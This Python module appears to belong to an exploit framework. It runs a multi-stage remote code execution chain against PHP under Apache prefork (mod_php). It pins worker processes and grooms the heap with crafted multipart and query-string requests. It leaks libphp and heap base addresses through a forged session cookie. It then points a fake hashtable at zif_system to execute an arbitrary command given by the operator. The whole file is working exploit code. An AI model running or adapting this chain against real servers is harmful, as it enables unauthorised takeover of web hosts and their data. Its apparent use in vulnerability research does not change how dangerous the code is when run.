"""One-shot prefork-pinned A1 -> B1 -> A2 -> B2 state machine."""

from __future__ import annotations

import argparse
import socket
import time

from core.chain import RunContext
from core.profile import ProfileSpec
from core.result import Outcome, RunResult, StageResult
from core.target import validate_http_path

from .affinity import PreforkPinning
from .carrier import validate_command
from .model import CHAIN_ID, ModPhpPinnedCalibration
from .stage_a1 import a1_parts, send_a1
from .stage_b1 import analyse, chunked_post, decode_cookie, make_body
from .stages_a2b2 import send_a2, send_b2
from .wire import recv_all, status_code


def query_path(path: str, a1: object) -> str:
    """Apply the profile's query-string grooming without inference."""
    count = a1.query_params
    released_fields = a1.query_released_fields
    secondary_fields = a1.query_secondary_released_fields
    if not count and not released_fields and not secondary_fields:
        return path
    items: list[str] = []
    for index in range(count):
        width = (
            a1.query_long_name_length
            if index >= count - a1.query_long_name_count
            else a1.query_name_length
        )
        name = f"q{index:07d}".ljust(width, "Q")
        items.append(name + "=" + "v" * a1.query_value_length)
    released_names = [
        f"r{index:03d}".ljust(a1.query_released_name_length, "R")
        for index in range(released_fields)
    ]
    items.extend(
        name + "=" + "R" * a1.query_released_value_length
        for name in released_names
    )
    for index, name in enumerate(released_names):
        width = (
            a1.query_released_long_replacement_length
            if index >= released_fields - a1.query_released_long_replacement_count
            else a1.query_released_replacement_length
        )
        items.append(name + "=" + "r" * width)
    secondary_names = [
        f"s{index:03d}".ljust(a1.query_secondary_released_name_length, "S")
        for index in range(secondary_fields)
    ]
    items.extend(
        name + "=" + "S" * a1.query_secondary_released_value_length
        for name in secondary_names
    )
    items.extend(
        name + "=" + "s" * a1.query_secondary_released_replacement_length
        for name in secondary_names
    )
    separator = "&" if "?" in path else "?"
    return path + separator + "&".join(items)


def run_a1(context: RunContext, profile: ModPhpPinnedCalibration) -> bytes:
    target = context.target
    a1 = profile.a1
    parts = a1_parts(
        sid_size=a1.sid_size,
        sid_late=a1.sid_late,
        files=a1.files,
        depth=a1.depth,
        live_files=a1.live_files,
        ct1=a1.content_type_1,
        ct2=a1.content_type_2,
        fillers=a1.fillers,
        filler_name=a1.filler_name,
        filler_value=a1.filler_value,
        big=a1.big,
        big_size=a1.big_size,
        big_name=a1.big_name,
        big_name_count=a1.big_name_count,
        big_alt_name=a1.big_alt_name,
        tail_big_size=a1.tail_big_size,
        tail_big_count=a1.tail_big_count,
        burners=a1.burners,
        burner_size=a1.burner_size,
        burner_name=a1.burner_name,
        burner_long_name_count=a1.burner_long_name_count,
        burner_long_name=a1.burner_long_name,
        late_groom_fields=a1.late_groom_fields,
        late_groom_name=a1.late_groom_name,
        late_groom_value=a1.late_groom_value,
        late_groom_alt_value_count=a1.late_groom_alt_value_count,
        late_groom_alt_value=a1.late_groom_alt_value,
        released_fields=a1.released_fields,
        released_name=a1.released_name,
        released_value=a1.released_value,
        released_alt_value_count=a1.released_alt_value_count,
        released_alt_value=a1.released_alt_value,
        released_replacement_value=a1.released_replacement_value,
        released_long_replacement_count=a1.released_long_replacement_count,
        released_long_replacement_value=a1.released_long_replacement_value,
        progress_size=a1.progress_size,
    )
    return send_a1(
        target.connect_host,
        target.port,
        query_path(target.path, a1),
        parts,
        chunk_size=a1.transport_chunk_size,
        host_header=target.host_header,
        timeout=target.timeout,
    )


def run_b1(
    context: RunContext,
    profile: ModPhpPinnedCalibration,
) -> tuple[bytes, bytes, dict[str, object]]:
    target = context.target
    b1 = profile.b1
    boundary = b"codex843b1"
    body = make_body(
        boundary,
        profile.heap.stale_session_id,
        b1.fake_length,
        b1.sprays,
        b1.data_start,
        b1.nested_fields,
        b1.nested_depth,
        b1.small_fields,
        b1.small_name_size,
        b1.small_value_size,
        b1.small_after_nested,
        b1.page_spec,
        b1.tail_pages,
        b1.release_sprays,
        b1.carrier_sprays,
        b1.carrier_pages,
        abi=profile.abi,
        allocator=profile.allocator,
        gc_refcount=b1.fake_string_gc_refcount,
        gc_type=b1.fake_string_gc_type,
        string_hash=b1.fake_string_hash,
        marker=b1.marker,
    )
    response = chunked_post(
        target.connect_host,
        target.port,
        target.path,
        body,
        boundary,
        chunk_size=b1.transport_chunk_size,
        host_header=target.host_header,
        timeout=target.timeout,
    )
    cookie = decode_cookie(response)
    info = analyse(
        cookie,
        profile.symbols.zval_ptr_dtor,
        profile.heap.stale_session_id,
        abi=profile.abi,
        allocator=profile.allocator,
        marker=b1.marker,
    )
    return response, cookie, info


def leaked_bases(
    info: dict[str, object], profile: ModPhpPinnedCalibration,
) -> tuple[int, int, int]:
    if not info.get("marker_ok") or info.get("decoded") != profile.b1.fake_length:
        raise RuntimeError("B1 did not return the complete forged cookie")
    candidates = info.get("libphp_candidates")
    if not isinstance(candidates, list) or not candidates or not isinstance(candidates[0], dict):
        raise RuntimeError("B1 did not expose zval_ptr_dtor")
    best = candidates[0]
    libphp = best.get("base")
    repetitions = best.get("exact_slots")
    if (
        not isinstance(libphp, int)
        or not isinstance(repetitions, int)
        or repetitions < profile.allocator.min_dtor_repetitions
    ):
        raise RuntimeError("libphp candidate lacks repeated pDestructor evidence")
    main = info.get("request_main_base")
    delta = libphp - main if isinstance(main, int) else None
    if delta is None or not (
        profile.allocator.min_libphp_main_delta
        <= delta
        <= profile.allocator.max_libphp_main_delta
    ):
        # A parsed ZendMM chunk header is stronger evidence than pointer
        # clustering. Never replace an explicit structural result with an
        # inferred cluster merely because the profile's delta rejects it.
        if info.get("main_recovery") == "chunk_header":
            if delta is None:
                raise RuntimeError(
                    "B1 did not expose one structurally unique ZendMM main chunk"
                )
            raise RuntimeError(f"implausible libphp-main delta {delta:#x}")
        # Extra DSOs can contribute a denser pointer cluster than ZendMM's
        # request main. Cross-check disclosed clusters against the independently
        # recovered libphp base and the profile's calibrated distance interval.
        # Ambiguity is a hard failure: this is not a nearest-address heuristic.
        heap_candidates = info.get("heap_candidates")
        allow_cluster_fallback = (
            profile.allocator.main_cluster_min_slots > 0
            and profile.allocator.main_cluster_min_unique > 0
        )
        plausible = [] if (
            not allow_cluster_fallback or not isinstance(heap_candidates, list)
        ) else [
            item["base"]
            for item in heap_candidates
            if isinstance(item, dict)
            and isinstance(item.get("base"), int)
            and isinstance(item.get("slots"), int)
            and isinstance(item.get("unique"), int)
            and item["slots"] >= profile.allocator.main_cluster_min_slots
            and item["unique"] >= profile.allocator.main_cluster_min_unique
            and item["unique"] / item["slots"]
            >= profile.allocator.main_cluster_min_unique_ratio
            and profile.allocator.min_libphp_main_delta
            <= libphp - item["base"]
            <= profile.allocator.max_libphp_main_delta
        ]
        if len(plausible) != 1:
            if delta is None:
                raise RuntimeError(
                    "B1 did not expose one structurally unique ZendMM main chunk"
                )
            raise RuntimeError(f"implausible libphp-main delta {delta:#x}")
        main = plausible[0]
    return main, libphp, repetitions


def send_get(context: RunContext, path: str | None = None) -> bytes:
    target = context.target
    request_path = target.path if path is None else path
    request = (
        f"GET {request_path} HTTP/1.1\r\n"
        f"Host: {target.host_header}\r\n"
        "Connection: close\r\n\r\n"
    ).encode("ascii")
    sock = socket.create_connection(
        (target.connect_host, target.port), timeout=target.timeout,
    )
    try:
        sock.settimeout(target.timeout)
        sock.sendall(request)
        return recv_all(sock)
    finally:
        sock.close()


def http_response_body(response: bytes) -> bytes:
    """Return only the HTTP message body; malformed header-only data has no body."""
    _head, separator, body = response.partition(b"\r\n\r\n")
    return body if separator else b""


class ModPhpPinnedChain:
    id = CHAIN_ID
    summary = "mod_php N-1 prefork pinning with A1/B1/A2/B2"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        parser.add_argument(
            "--workers",
            type=int,
            help="override the profile's target MaxRequestWorkers default",
        )
        parser.add_argument("--leak-only", action="store_true")
        parser.add_argument(
            "--cmd",
            required=True,
            help="command encoded in the final B2 carrier",
        )
        parser.add_argument("--verify-path")
        parser.add_argument("--verify-text")

    @staticmethod
    def _calibration(profile: ProfileSpec[object]) -> ModPhpPinnedCalibration:
        if profile.chain_id != CHAIN_ID:
            raise ValueError(f"profile {profile.id} belongs to {profile.chain_id}")
        if not isinstance(profile.calibration, ModPhpPinnedCalibration):
            raise TypeError(f"profile {profile.id} has the wrong calibration type")
        profile.validate()
        return profile.calibration

    def describe_profile(self, profile: ProfileSpec[object]) -> dict[str, object]:
        calibration = self._calibration(profile)
        return {
            "profile": profile.id,
            "chain": profile.chain_id,
            "target": profile.target,
            "scheduler": profile.scheduler,
            "requirements": profile.requirements,
            "provenance": profile.provenance,
            "offsets": {
                "stale_session_id": calibration.heap.stale_session_id,
                "fake_array": calibration.heap.fake_array,
                "zval_ptr_dtor": calibration.symbols.zval_ptr_dtor,
                "zif_system": calibration.symbols.zif_system,
            },
        }

    def run(
        self,
        context: RunContext,
        profile: ProfileSpec[object],
        args: argparse.Namespace,
    ) -> RunResult:
        calibration = self._calibration(profile)
        if context.target.scheme != "http":
            return RunResult(
                self.id, profile.id, Outcome.REQUIREMENT_MISSING,
                "the pinned chain currently requires direct HTTP",
            )
        if bool(args.verify_path) != bool(args.verify_text):
            return RunResult(
                self.id, profile.id, Outcome.REQUIREMENT_MISSING,
                "--verify-path and --verify-text must be supplied together",
            )
        verification_marker: bytes | None = None
        if args.verify_path:
            try:
                validate_http_path(args.verify_path, label="HTTP verification path")
                verification_marker = args.verify_text.encode("utf-8")
            except (UnicodeEncodeError, ValueError) as exc:
                return RunResult(
                    self.id, profile.id, Outcome.REQUIREMENT_MISSING, str(exc),
                )
        default_workers = (
            profile.scheduler.default_workers if profile.scheduler is not None else None
        )
        workers = args.workers if args.workers is not None else default_workers
        if workers is None or workers < 1:
            return RunResult(
                self.id, profile.id, Outcome.REQUIREMENT_MISSING,
                "a positive --workers value is required for this profile",
            )
        try:
            command = args.cmd.encode("utf-8")
            validate_command(command, calibration.b2.value_length, calibration.abi)
        except (UnicodeEncodeError, ValueError) as exc:
            return RunResult(self.id, profile.id, Outcome.REQUIREMENT_MISSING, str(exc))

        stages: list[StageResult] = []
        preflight = send_get(context)
        item = context.evidence.write_bytes("preflight.response.http", preflight)
        preflight_status = status_code(preflight)
        stages.append(StageResult(
            "preflight",
            Outcome.SUCCESS if preflight_status == 200 else Outcome.REQUIREMENT_MISSING,
            "" if preflight_status == 200 else "target path did not return HTTP 200",
            values={"status": preflight_status},
            evidence=(item,) if item else (),
        ))
        if preflight_status != 200:
            return RunResult(
                self.id,
                profile.id,
                Outcome.REQUIREMENT_MISSING,
                f"preflight expected HTTP 200, got {preflight_status}",
                tuple(stages),
            )

        main_base: int | None = None
        libphp_base: int | None = None
        b2_response = b""
        try:
            with PreforkPinning(context.target, workers) as pins:
                def healthy(stage: str) -> None:
                    try:
                        pins.ensure_healthy()
                    except RuntimeError as exc:
                        raise RuntimeError(f"worker pinning failed {stage}: {exc}") from exc

                if workers > 1:
                    time.sleep(0.5)
                    warm = send_get(context)
                    context.evidence.write_bytes("pinned-preflight.response.http", warm)
                healthy("before A1")
                a1_response = run_a1(context, calibration)
                healthy("after A1")
                a1_cookie = (
                    b"set-cookie: phpsessid="
                    in a1_response.partition(b"\r\n\r\n")[0].lower()
                )
                a1_evidence = context.evidence.write_bytes("a1.response.http", a1_response)
                a1_ok = (
                    status_code(a1_response) == calibration.a1.expected_status
                    and a1_cookie == calibration.a1.expected_cookie
                )
                print(
                    f"A1 status={status_code(a1_response)} cookie={a1_cookie}",
                    flush=True,
                )
                stages.append(StageResult(
                    "a1",
                    Outcome.SUCCESS if a1_ok else Outcome.TRANSIENT_MISS,
                    values={"status": status_code(a1_response), "cookie": a1_cookie},
                    evidence=(a1_evidence,) if a1_evidence else (),
                ))
                if not a1_ok:
                    return RunResult(
                        self.id, profile.id, Outcome.TRANSIENT_MISS,
                        "A1 missed; the one-shot worker state was discarded",
                        tuple(stages),
                    )

                healthy("before B1")
                b1_response, cookie, info = run_b1(context, calibration)
                healthy("after B1")
                b1_evidence = context.evidence.write_bytes("b1.response.http", b1_response)
                context.evidence.write_json("b1.analysis.json", info)
                print(
                    f"B1 status={status_code(b1_response)} decoded={len(cookie)} "
                    f"marker={bool(info.get('marker_ok'))}",
                    flush=True,
                )
                if status_code(b1_response) != calibration.b1.expected_status:
                    raise ValueError("B1 returned an unexpected HTTP status")
                try:
                    main_base, libphp_base, repetitions = leaked_bases(info, calibration)
                except RuntimeError as exc:
                    stages.append(StageResult(
                        "b1", Outcome.TRANSIENT_MISS, str(exc),
                        {"status": status_code(b1_response), "decoded": len(cookie)},
                        (b1_evidence,) if b1_evidence else (),
                    ))
                    return RunResult(
                        self.id, profile.id, Outcome.TRANSIENT_MISS,
                        "B1 miss; the one-shot worker state was discarded",
                        tuple(stages),
                    )
                print(
                    f"main={main_base:#x} libphp={libphp_base:#x} "
                    f"dtor_repetitions={repetitions}",
                    flush=True,
                )
                stages.append(StageResult(
                    "b1", Outcome.SUCCESS,
                    values={
                        "main_base": main_base,
                        "libphp_base": libphp_base,
                        "dtor_repetitions": repetitions,
                    },
                    evidence=(b1_evidence,) if b1_evidence else (),
                ))
                if args.leak_only:
                    return RunResult(
                        self.id, profile.id, Outcome.SUCCESS,
                        "validated runtime bases recovered",
                        tuple(stages),
                    )

                healthy("before A2")
                a2_exchange = send_a2(
                    context.target,
                    parts=calibration.a2.parts,
                    depth=calibration.a2.depth,
                    fillers=calibration.a2.fillers,
                )
                healthy("after A2")
                a2_evidence = context.evidence.write_bytes(
                    "a2.response.http", a2_exchange.response,
                )
                a2_status = status_code(a2_exchange.response)
                print(f"A2 status={a2_status} bytes={len(a2_exchange.response)}", flush=True)
                a2_ok = a2_status == calibration.a2.expected_status
                stages.append(StageResult(
                    "a2", Outcome.SUCCESS if a2_ok else Outcome.TRANSIENT_MISS,
                    values={"status": a2_status, "body_bytes": a2_exchange.body_bytes},
                    evidence=(a2_evidence,) if a2_evidence else (),
                ))
                if not a2_ok:
                    return RunResult(
                        self.id, profile.id, Outcome.TRANSIENT_MISS,
                        "A2 did not reach the calibrated state",
                        tuple(stages),
                    )

                healthy("before B2")
                fake_array = main_base + calibration.heap.fake_array
                b2_exchange = send_b2(
                    context.target,
                    first_sprays=calibration.b2.first_sprays,
                    second_sprays=calibration.b2.second_sprays,
                    value_length=calibration.b2.value_length,
                    target_address=fake_array,
                    reference_refcount=calibration.b2.reference_refcount,
                    name_length=calibration.b2.name_length,
                    hold_seconds=calibration.b2.hold_seconds,
                    hashtable_address=fake_array,
                    zif_system=libphp_base + calibration.symbols.zif_system,
                    abi=calibration.abi,
                    command=command,
                )
                healthy("after B2")
                b2_response = b2_exchange.response
                b2_evidence = context.evidence.write_bytes("b2.response.http", b2_response)
                print(
                    f"B2 dispatched command; response_bytes={len(b2_response)}",
                    flush=True,
                )
                stages.append(StageResult(
                    "b2", Outcome.UNCONFIRMED,
                    "command carrier dispatched; transport behavior is not proof",
                    {"response_bytes": len(b2_response)},
                    (b2_evidence,) if b2_evidence else (),
                ))
        except RuntimeError as exc:
            stages.append(StageResult("affinity", Outcome.UNSAFE_TO_CONTINUE, str(exc)))
            return RunResult(
                self.id, profile.id, Outcome.UNSAFE_TO_CONTINUE, str(exc), tuple(stages),
            )
        except ValueError as exc:
            return RunResult(
                self.id, profile.id, Outcome.TRANSIENT_MISS, str(exc), tuple(stages),
            )

        if args.verify_path and verification_marker is not None:
            verify_response = send_get(context, args.verify_path)
            verify_evidence = context.evidence.write_bytes(
                "verification.response.http", verify_response,
            )
            verify_body = http_response_body(verify_response)
            verify_status = status_code(verify_response)
            marker_found = verification_marker in verify_body
            verified = verify_status == 200 and marker_found
            print(
                f"Verify status={verify_status} marker={marker_found}",
                flush=True,
            )
            verify_reason = (
                "verification marker found"
                if verified
                else (
                    f"verification endpoint returned HTTP {verify_status}"
                    if verify_status != 200
                    else "verification marker absent from response body"
                )
            )
            stages.append(StageResult(
                "verify",
                Outcome.SUCCESS if verified else Outcome.UNCONFIRMED,
                verify_reason,
                {"status": verify_status, "marker_found": marker_found},
                (verify_evidence,) if verify_evidence else (),
            ))
            if verified:
                return RunResult(
                    self.id, profile.id, Outcome.SUCCESS,
                    "command side effect verified over an independent HTTP request",
                    tuple(stages),
                )
            failure_reason = (
                f"verification failed: GET {args.verify_path} returned "
                f"HTTP {verify_status}"
                if verify_status != 200
                else "verification failed: expected text was absent from "
                "the HTTP response body"
            )
            return RunResult(
                self.id, profile.id, Outcome.UNCONFIRMED,
                failure_reason,
                tuple(stages),
            )
        return RunResult(
            self.id, profile.id, Outcome.UNCONFIRMED,
            "B2 dispatched; no independent verifier was configured",
            tuple(stages),
        )


CHAIN = ModPhpPinnedChain()


__all__ = (
    "CHAIN",
    "ModPhpPinnedChain",
    "http_response_body",
    "leaked_bases",
    "query_path",
)
